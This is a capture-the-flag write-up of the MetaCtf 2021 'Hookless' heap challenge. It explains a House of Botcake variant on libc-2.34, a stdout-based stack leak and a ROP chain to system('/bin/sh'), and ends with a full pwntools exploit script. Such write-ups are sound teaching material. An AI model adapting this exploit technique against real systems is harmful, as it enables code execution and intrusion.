## Hookless


was a heap challenge from MetaCtf 2021.

pretty standard heap menu as you can see.

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/Hookless/pics/menu.png)

It is based on libc-2.34, and have all the mitigations up to this version,

Specifically the libc-2.34 has no more hooks for malloc, free, realloc.. so it needs different ways to obtain a code execution.

we quickly check the binary

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/Hookless/pics/checksec.png)

Ok only Partial RELRO, so GOT entries could be modified.. (but we will not use it..)

The vulnerabilities usable to exploit the heap challenge were:

* a double free in the delete function, as the allocation pointers are not nulled after a free.
* an UAF in the edit function, but you can use it only one time.
* an UAF in display function (useful to leak addresses)



You are limited to 15 allocations, no more, and when a bloc is freed the allocation counter is not decremented. 

Basically the exploitation plan was to use the "House of Botcake" heap exploitation technic,

a bit modified to fit in the 15 allocations limit.


you can find a good explanation on it here: 

[https://github.com/shellphish/how2heap/blob/master/glibc_2.34/house_of_botcake.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.34/house_of_botcake.c)

or here,

[https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c](http://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c)


I have to modify a bit the original attack, to fit in the 15 allocations limit..

So, we allocate 6 chunks from tcache of 0x100 size,

then two more chunks (A and B) of 0x100 size (this is the two chunks that we will use for the attack), 

then a last padding chunk of size 0x100 , to prevent consolidation.

then we free the first 6 chunks, and the last padding chunk. That will fill the tcache 0x110 list (7 chunks)

even freed, the padding chunk will prevent consolidation..

Then we first free chunk B (that will put a unsorted libc address on heap , that we will leak to calcultate libc address), then we free bloc A

We then allocate a chunk of 0x100 size from tcache, and double free the chunk B.

Then we allocate a chunk of size 0x130, that bloc will be allocated at the address of chunk A, and will overlap chunk B, with it we can modify bloc B metadata, and fd, bk pointers..

that's the basis of House of Botcake.

With out overlapping chunk we modify the fd pointer of chunk B, to make it points to _IO_2_1_stdout_

in libc.

Now we have to allocate two chunks, the second one will be allocated to our target.

We will modify __IO_2_1_stdout__  to leak the stack environment variables address via the libc "environ" variable, we have for this to overwrite many stdout pointers..

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/Hookless/pics/leak.environ.png)

what will happen after altering stdout like this, it that stdout will leak the stack address..

like you can see here:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/Hookless/pics/stdout.png)


this technic will somewhat broke stdout output, the ending carriage return will disappears.. but it's still usable...


Now that we know the stack address, we just have to double free another chunk,

then modify its FD pointer with the edit function (usable only once...), to make it points to stack..

and we will have an allocation of a chunk on stack..

we can directly overwrite the create function return address, with a ROP, that will call system("/bin/sh"),

and like that, we will have a code execution without any Hooks...

if you understand nothing of my explanation :)

just read the code...

**P.S.:**

we probably could also have leaked the address of the bss or program base, via ld.so vars..

and overwrite a GOT entry... we left that as an exercise for the most motivated...


```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

exe = ELF('./chall.patched')
libc = ELF('./libc.so.6')

host, port = "host.cg21.metaproblems.com", "3260"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# max size 1024
def add(idx,size,data):
  p.sendlineafter('Exit\n','1')
  p.sendlineafter('index?\n',str(idx))
  p.sendlineafter('it?\n',str(size))
  p.sendafter('here?\n',data)

def addn(idx,size,data):
  p.sendlineafter('Exit','1')
  p.sendlineafter('index?',str(idx))
  p.sendlineafter('it?',str(size))
  p.sendafter('here?',data)

def display(idx):
  p.sendlineafter('Exit\n','2')
  p.sendlineafter('index?\n',str(idx))

def edit(idx,data):
  p.sendlineafter('Exit\n','3')
  p.sendlineafter('index?\n',str(idx))
  p.sendafter('here?\n',data)

def editn(idx,data):
  p.sendlineafter('Exit','3')
  p.sendlineafter('index?',str(idx))
  p.sendafter('here?',data)

# double free
def free(idx):
    p.sendlineafter('Exit\n','4')
    p.sendlineafter('index?\n',str(idx))

def freen(idx):
    p.sendlineafter('Exit','4')
    p.sendlineafter('index?',str(idx))



for i in range(6):
  add(i,0x100,chr(0x41+i))

add(6,0x100,'1')
add(7,0x100,'2')
add(8,0x100, '3')
for i in range(6):
  free(i)
free(8)

# leak heap base
display(0)
heap = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))<<12
print('heap base = '+hex(heap))

free(7)
display(7)
# leak unsorted libc address
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x1edcc0
print('libc base = '+hex(libc.address))

free(6)
add(9,0x100,p64(0xdeadbeef)*2)
free(7)
# get a bloc overlapping next bloc, overwrite dest
add(10,0x130,'\x00'*0x108+p64(0x111)+p64(libc.symbols['_IO_2_1_stdout_'] ^ (heap>>12)))
# nop
add(11,0x100,'a')

# overwrite stdout to leak stack via libc environ var
payload  = p64(0xfbad1800) + p64(0)*3 + p64(libc.sym['environ']) + p64(libc.sym['environ'] + 0x8)*3 + p64(libc.sym['environ'] + 0x9)
add(12,0x100,payload)

stack = u64(p.recv(8))
print('stack leak environ = '+hex(stack))

# double free another block to overwrite stack
freen(11)
editn(11,p64((stack-0x168) ^ (heap>>12)))
addn(13,0x100, 'X'*0x80)

rop = ROP(libc)
retg = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# copy the payload on to stack to create function return address
payload = '/bin/sh\x00'+p64(retg)+p64(pop_rdi)+p64(stack-0x168)+p64(libc.symbols['system'])
addn(14,0x100, payload)

p.interactive()
```

*nobodyisnobody still pwning things...*

